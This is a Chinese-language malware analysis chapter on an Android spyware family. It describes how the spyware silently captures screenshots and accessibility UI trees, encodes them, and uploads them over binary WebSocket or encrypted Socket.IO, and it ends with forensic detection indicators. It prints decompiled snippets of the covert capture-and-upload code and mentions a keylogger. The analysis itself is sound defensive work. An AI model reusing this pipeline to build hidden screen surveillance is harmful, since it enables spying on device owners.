# 05 · 截屏与无障碍数据的上报链路（API / 编码 / 通道）

> 直接回答三个问题：
> **① 用什么 API？** 主力是 **`AccessibilityService.takeScreenshot()`（Android 11 / API 30+）**，另有 **adb `screencap`** 与 **MediaProjection+ImageReader** 两套并行实现。
> **② 截图后怎么上报？** 先在设备端压成 **JPEG**（无 PNG、无分片、无加密），再套 **5 字节自定义帧头** 发到 **二进制 WebSocket**。
> **③ 用 WS 吗？** 是。**99% 走二进制 WS**（type 1/2/4/6/7）；只有单帧 `takeScreen` 与无障碍树的降级路径走 Socket.IO（AES 信封 + Base64）。**WebRTC 在本包里是空壳，不传任何媒体。**

---

## 1. 速览矩阵

| 能力 | 采集 API | 编码/尺寸 | 承载通道 | 帧类型 / 事件 | 前置条件 |
|---|---|---|---|---|---|
| `takeScreen` 单帧截图 | `AccessibilityService.takeScreenshot(0, mainExecutor, cb)` | JPEG **q=50**，宽 **≤720**（原比例） | **Socket.IO** `enc msg` | action **`screenshot`**，`{img:"<Base64>", deviceId}` | 无障碍服务已连、**API≥30** |
| `silentShot` / `startSilentStream` 连续帧 | 同上 `takeScreenshot` | JPEG **q=`quality`**(默认 40，clamp≥10)，尺寸 **÷`size`**(默认 3) | **二进制 WS** | **type=1** 原始 JPEG | 同上；`quality/size` 由指令给 |
| 每 60s 缩略图（ThumbUp） | 同上 `takeScreenshot` | JPEG **q=30**，宽 **120** | **二进制 WS** | **type=4** | API≥30；无障碍连上即自动启动 |
| `startAdbStream` 连续帧 | **adb `screencap -p`**（打包的 `libadb.so`） | PNG → `inSampleSize` 降采样 → JPEG **q=`quality`**(clamp 10–80) | **二进制 WS** | **type=1** | adb 已配对/连接 |
| `startHD` / `startHDBlack` 高清推流 | **MediaProjection + ImageReader + VirtualDisplay** | RGBA_8888 → Bitmap → JPEG **q=`quality`**(默认 25)，帧率 `fps`(clamp 5–60) | **二进制 WS** | **type=6** | 用户授权投屏（`HDPermActivity`）、前台服务 type=mediaProjection |
| 无障碍 UI 树 | `getRootInActiveWindow()` + 节点遍历 | XML → **gzip → Base64** | **二进制 WS**，失败回退 Socket.IO | **type=2** / action `capture` | 无障碍服务 |
| adb UI 树 | adb `uiautomator dump` | XML → gzip → Base64 | **二进制 WS** | **type=7** | adb 已连接 |
| WebRTC 推流 | — | — | — | `webrtcOffer/Ice/Stop` 仅解析 | **未实现（空壳，见 §7）** |

## 2. 主力：`AccessibilityService.takeScreenshot()`（API 30+）

### 2.1 调用点（三处，都是同一个 API）

```java
// ① 单帧：p086/C0797.java#m1702（action=takeScreen / screenshot）
if (myAccessibilityService == null || Build.VERSION.SDK_INT < 30) return;   // ★硬门禁
myAccessibilityService.takeScreenshot(0, mainExecutor, new C0796(0, this));

// ② 连续采样：p087/RunnableC0823.java#case5（silentShot / startSilentStream 的定时器）
if (Build.VERSION.SDK_INT >= 30) {
    myAccessibilityService.takeScreenshot(0, AbstractC0831.f2915, new C0830());
} else {
    Log.w("BmtvScreenCapture", "Screenshot requires Android R (API 30)+");
}

// ③ 60s 缩略图：p087/RunnableC0823.java#case11
myAccessibilityService.takeScreenshot(0, AbstractC1029.f3234, new C0796(1, orch));
```

`takeScreenshot(int displayId, Executor, TakeScreenshotCallback)` 是 **Android 11 (API 30)** 引入的接口（无需 MediaProjection 授权、无需前台服务、可后台调用）——这正是该家族偏爱它的原因：**一次无障碍授权即可长期静默截屏**。

回调整形（三个消费方都一样）：

```java
onSuccess(AccessibilityService.ScreenshotResult r) {
    Bitmap hw  = Bitmap.wrapHardwareBuffer(r.getHardwareBuffer(), r.getColorSpace()); // 硬件缓冲
    Bitmap bmp = hw.copy(Bitmap.Config.ARGB_8888, false);   // 必须 copy 成软件位图才能压缩
    hw.recycle();
    ... 缩放/压缩 ...
    r.getHardwareBuffer().close();                          // 必须关闭 HardwareBuffer，否则会耗尽
}
```

### 2.2 单帧 `takeScreen` → **走 Socket.IO**（唯一走非 WS 的截图）

```java
// p086/C0796.java case 0 → new Thread(new RunnableC0098(c0797, bitmap)) → f133=7, f135="screenshot"
// androidx/room/RunnableC0098.java case 7
if (bmp.getWidth() > 720) bmp = Bitmap.createScaledBitmap(bmp, 720, h*720/w, true);
bmp.compress(Bitmap.CompressFormat.JPEG, 50, baos);          // q=50
String b64 = Base64.encodeToString(baos.toByteArray(), 2);   // NO_WRAP
JSONObject j = new JSONObject();
j.put("img", b64);
j.put("deviceId", deviceId);
sender.m872("screenshot", j);        // → emit("enc msg", AES(j)) → Socket.IO
```

- 通道：**Socket.IO**（非二进制 WS），因为该路径复用了 `MessageSender.m872()` 的统一封装。
- 上限：720px / q50 → 典型 60–150 KB Base64，仍在 Engine.IO 单帧可承受范围。
- `takeScreen` 与 `screenshot` 两个 action 都进 `m1702`，行为相同（同一实现）。

### 2.3 连续帧 `silentShot` / `startSilentStream` → **二进制 WS type=1**

```java
// p087/C0830.java  onSuccess
Bitmap b = copy(ARGB_8888);
if (AbstractC0831.f2911.get()) b = AbstractC0831.m1786(b, 50);   // 锁定态下套 ColorMatrix（画面被重映射）
int w = b.getWidth()  / AbstractC0831.f2908;    // size，默认 3
int h = b.getHeight() / AbstractC0831.f2908;
b = Bitmap.createScaledBitmap(b, w, h, true);
b.compress(JPEG, AbstractC0831.f2909, baos);    // quality，默认 40，设 <10 会被 clamp
AbstractC0831.m1785(baos.toByteArray());        // → C0798.m1717() → 帧 type=1
```

调度器（`p087/AbstractC0831`）：

| 参数 | 默认 | 说明 |
|---|---|---|
| 采样间隔 `f2912` | **200 ms** | 连续失败 `>3` 次后间隔 ×失败次数（上限 30 s），成功即复位 |
| 尺寸除数 `f2908` | 3 | 指令 `size`，`Math.max(size,1)` |
| JPEG 质量 `f2909` | 40 | 指令 `quality`，`Math.max(q,10)` |
| 运行标志 | `f2910` | `startSilentStream` 置位，`stopSilentStream` 清除并 `removeCallbacksAndMessages` |

发送封装（所有二进制通道共用）：

```java
// p086/C0798.java
m1717(byte[] payload) {                     // payload = 纯 JPEG 字节
    return ws.send(BinaryMessage(C0793.m1614((byte)1, payload)));
}
// p086/C0793.java
m1614(type, payload) = [type:1B][len:int32 BE][payload]
```

即 **一次 `takeScreenshot` → 一帧 JPEG → 一条 WS 二进制消息**，无分包、无压缩容器（JPEG 自身已压缩），**设备端不加密**（加密只发生在 Socket.IO 通道）。

### 2.4 缩略图心跳（type=4）

无障碍服务 `onServiceConnected()` 且 API≥30 时置 `f3235=true`，启动 `ThumbBg` 线程 → `m2018()` 每 **60 000 ms** 触发一次：

```java
// p087/RunnableC0823 case 11（仅当二进制 WS 已连才截）
int h = bmp.getHeight() * 120 / bmp.getWidth();
bmp = Bitmap.createScaledBitmap(bmp, 120, h, true);
bmp.compress(JPEG, 30, baos);                    // 120px 宽 / q30
((C0798) orch).m1716(C0793.m1614((byte) 4, baos.toByteArray()));
AbstractC1029.m2018();                           // 再排 60s
```

用途：运营端在“实时流未开启”时也能看到当前屏幕小图（判断设备是否活跃/在哪个 App）。

## 3. adb 截屏：`screencap -p` → WS type=1

```java
// p085/AbstractC0791.java   （action: startAdbStream{quality,interval}）
bArr = adb.screencapPng();                      // bundled libadb.so 执行 screencap -p，返回 PNG 字节
BitmapFactory.Options o = new BitmapFactory.Options();
o.inSampleSize = f2731;                         // 默认 2（== 1/2 分辨率解码，省内存）
Bitmap bmp = BitmapFactory.decodeByteArray(bArr, 0, bArr.length, o);
bmp.compress(JPEG, f2730, baos);                // quality clamp 10..80
orch.m1717(baos.toByteArray());                 // → 帧 type=1
```

| 参数 | 默认 | 说明 |
|---|---|---|
| `quality` | 40 | clamp 10–80 |
| `interval` | 400 ms | clamp ≥200 ms；循环内用“目标时刻差”补偿，保证节奏稳定 |
| `inSampleSize` | 2 | 硬编码 |

特点：**不需要无障碍、不需要投屏授权**，但需要 adb 配对（`startAutoPair`/`manualPair`）。API<30 或无障碍被禁时，这是唯一的连续截屏手段。

## 4. HD 推流：MediaProjection + ImageReader + VirtualDisplay → WS type=6

```java
// com/lite/cloudfinder/hd/HDStreamService.java#onStartCommand
MediaProjection mp = ((MediaProjectionManager) getSystemService("media_projection"))
                        .getMediaProjection(resultCode, data);           // data 来自 HDPermActivity 授权
mp.registerCallback(new C0857(this), handler);
ImageReader reader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 3);
reader.setOnImageAvailableListener(new C0858(this), handler);
virtualDisplay = mp.createVirtualDisplay("HDStream", width, height, dpi,
                        VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, handler);
startForeground(10099, notif, FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);   // type=32
```

```java
// p088/C0858.java#onImageAvailable
Image img = reader.acquireLatestImage();
ByteBuffer buf = img.getPlanes()[0].getBuffer();          // RGBA_8888，需处理 rowStride 填充
Bitmap bmp = Bitmap.createBitmap(w + rowStride/pixelStride, h, ARGB_8888);
bmp.copyPixelsFromBuffer(buf);
if (rowStride > 0) bmp = Bitmap.createBitmap(bmp, 0, 0, w, h);   // 裁掉行填充
if (AbstractC0829.f2901) bmp = HDStreamService.m658(this, bmp);  // 黑屏/隐私遮罩（black/light 指令）
bmp.compress(JPEG, quality, baos);                       // 默认 25
orch.m1716(C0793.m1614((byte) 6, baos.toByteArray()));   // → type=6
```

| 参数（指令 `startHD`） | 默认 | 说明 |
|---|---|---|
| `width` / `height` | 480 × 854 | 非法时回落到 `min(屏幕,480/854)` |
| `quality` | 25 | JPEG 质量 |
| `fps` | 25 | clamp 5–60；帧间隔 `f732 = 1000/fps`，以此节流 |

与 `takeScreenshot` 的差别：HD 是 **持续镜像**（VirtualDisplay 帧回调），分辨率/帧率更高，但**必须用户点一次“开始录制”授权**（`HDPermActivity` 弹系统对话框），且授权在进程重启后失效。

## 5. 无障碍数据（UI 树）上报

```java
// com/lite/cloudfinder/accessibility/MyAccessibilityService.java（约 3700–3790 行）
String xml  = buildHierarchy(root);              // <hierarchy><node text/class/package/bounds/…/>
String zip  = m599(xml);                         // gzip → Base64(NO_WRAP)
JSONObject j = {deviceId, pkg:"capture", ac:<前台Activity>, w, h, iw:0, ih:0,
                orient: w>h, deviceInfo:{…}, action:null, zip};
if (orch.m1751() && ws.send(frame(type=2, j))) { 日志 "uploadTree SENT via Binary WS"; return; }
sender.m872("capture", j);                        // ★降级：Socket.IO enc msg
```

- 正常路径：**WS type=2**；
- 二进制 WS 未连时：降级为 Socket.IO 的 `capture` 事件（同一个 JSON，`zip` 仍是 gzip+Base64）；
- adb 侧等价物：**type=7**（`ac:"adb"`，来自 `uiautomator dump`）；
- 触发节流：`m648()` 里 **200 ms** 去抖（同一时间窗口只允许一次树上传）。

键盘记录另走 Socket.IO：`KeylogEngine`（`p086/C0804`）把按键事件累积成 `cacheData`（含 `type/text[]/pkg/cls/points/bounds`），**不做屏幕抓取**。

## 6. 传输层：为什么是 WS，以及降级矩阵

```
截图字节 ──► C0793.m1614(type, bytes) ──► [1B type][4B BE len][bytes] ──► OkHttp WebSocket.send(ByteString)
              （type=1/2/4/6/7）
```

| 上游 | 首选通道 | 降级行为 | 证据 |
|---|---|---|---|
| 连续帧（silent/adb/HD） | WS type 1/6 | **不降级**，仅日志 `sendScreen failed, binary not connected` | `C0798.m1717` 返回 false；`AbstractC0791`/`AbstractC0831` 只打警告 |
| 缩略图 | WS type 4 | 不降级（本周期跳过，60 s 后重试） | `RunnableC0823` case 11 前置 `c0814.m1751()` |
| UI 树 | WS type 2 | **降级 Socket.IO `capture`** | `MyAccessibilityService` 中 `if (zSend) return; … m872("capture",…)` |
| 单帧 takeScreen | Socket.IO `screenshot` | — （本身就是 Socket.IO） | `RunnableC0098` case 7 |

为什么截图偏好二进制 WS：① 免 Base64（体积省 33%）；② 免 AES 加密开销（大帧 CPU 敏感）；③ OkHttp `readTimeout=0` 的 WS 长连接更适合高帧率；④ 与会话/指令共用同一条已建立的 TLS 连接。

## 7. 明确是“空壳/死路径”的部分（避免误判）

| 组件 | 结论 | 证据 |
|---|---|---|
| `WebRTCStreamService` / `ScreenRecordService` | **只有 `onBind` 返回 null 的空 Service** | 文件全文仅 8 行有效代码，`static final int f769 = 0` |
| `org.webrtc.*` / `PeerConnectionFactory` | **DEX 中不存在** | 字符串池检索无任何 `org/webrtc` 类 |
| `webrtcOffer` / `webrtcIce` / `webrtcStop` 处理器 | **只解析字段，不建连、不推流**（`int i = WebRTCStreamService.f769;` 后即结束） | `C0809` 的三个 `Emitter.Listener` |
| `takeScreenshot` 在 API 26–29 | **无回退**（`return`），只能靠 adb 或 MediaProjection | `m1702` 的 `SDK_INT < 30` 判断；`C0830` 的 "Screenshot requires Android R (API 30)+" 日志 |
| `takeScreen` 在二进制 WS 断开时 | 仍可用（走 Socket.IO），无需 WS | `RunnableC0098` case 7 只依赖 `C0809.f2808` |

## 8. 防守方/取证方可观测特征

| 特征 | 说明 |
|---|---|
| WS 二进制帧首字节 `01` / `04` / `06`，第 2–5 字节为 big-endian 长度，随后是 `FFD8FF…` | 直接可判 JPEG 屏幕帧；`04` 为 120px 缩略图（60 s 周期） |
| 帧节奏 | silent 模式 ≈5 fps（200 ms）；adb 模式 ≈2.5 fps（400 ms）；HD 按 `fps` |
| JPEG 尺寸特征 | silent：屏幕÷3、q40；单帧：≤720 宽、q50；缩略：120 宽、q30；HD：480×854、q25 |
| 首字节 `02`/`07` | UI 树：JSON，`zip` 字段为 gzip+Base64 的 `<hierarchy>` XML |
| Socket.IO `enc msg` 中 action=`screenshot` | 单帧截图（Base64 JPEG，`img` 字段） |
| Logcat TAG | `BmtvScreenCapture`(Frames/Screenshot OK)、`ThumbUp`、`AdbScreenLoop`、`HDStream`、`MyAccessSvc`(uploadTree) |
| 前台服务 | `HDStreamService` 通知 ID **10099**、channel `hd_stream_sys`、type=mediaProjection |
| 授权痕迹 | `HDPermActivity` 触发的系统投屏对话框（`createScreenCaptureIntent`） |
